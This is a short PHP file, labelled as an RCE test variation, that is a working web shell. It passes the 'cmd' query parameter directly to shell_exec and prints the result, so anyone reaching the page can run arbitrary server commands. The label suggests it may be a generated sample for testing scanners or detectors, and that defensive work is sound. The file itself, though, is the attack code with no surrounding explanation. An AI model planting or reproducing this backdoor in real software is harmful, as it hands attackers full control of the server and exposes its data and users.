<?php
// RCE test variation #847
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>